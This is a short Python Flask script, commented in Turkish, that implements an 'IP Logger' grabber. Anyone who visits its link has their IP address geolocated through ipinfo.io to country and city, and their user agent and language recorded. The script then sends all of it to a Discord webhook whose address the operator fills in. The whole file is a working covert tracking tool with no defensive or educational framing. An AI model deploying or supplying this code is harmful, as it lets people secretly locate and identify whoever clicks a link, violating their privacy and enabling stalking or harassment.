from flask import Flask, request
from dhooks import Webhook, Embed
import requests
import json
from urllib.request import urlopen

hook = Webhook("https://discord.com/api/webhooks/BURAYA_KENDI_WEBHOOK_LINKINI_YAZ")  # <--- burayı değiştir

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def grabbing():
    # IP alma
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        publicip = request.environ['REMOTE_ADDR']
    else:
        publicip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0]

    # ipinfo
    try:
        url = f'https://ipinfo.io/{publicip}/json'
        response = urlopen(url)
        data = json.load(response)
        country = data.get('country', 'Bilinmiyor')
        region = data.get('region', 'Bilinmiyor')
        city = data.get('city', 'Bilinmiyor')
        postal = data.get('postal', 'Bilinmiyor')
    except:
        country = region = city = postal = "Bilinmiyor"

    useragent = request.headers.get('User-Agent')
    lang = request.accept_languages.best_match(["en", "tr", "de", "fr", "ru"]) or "Bilinmiyor"

    embed = Embed(color=0x5CDBF0, timestamp='now')
    embed.set_author(name='IP Logger')
    embed.add_field(name='IP', value=publicip)
    embed.add_field(name='Ülke', value=country)
    embed.add_field(name='Şehir', value=city)
    embed.add_field(name='User-Agent', value=useragent[:500])  # çok uzun olmasın
    embed.add_field(name='Dil', value=lang)

    hook.send(embed=embed)
    return "Tamamdır kanka 👍"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
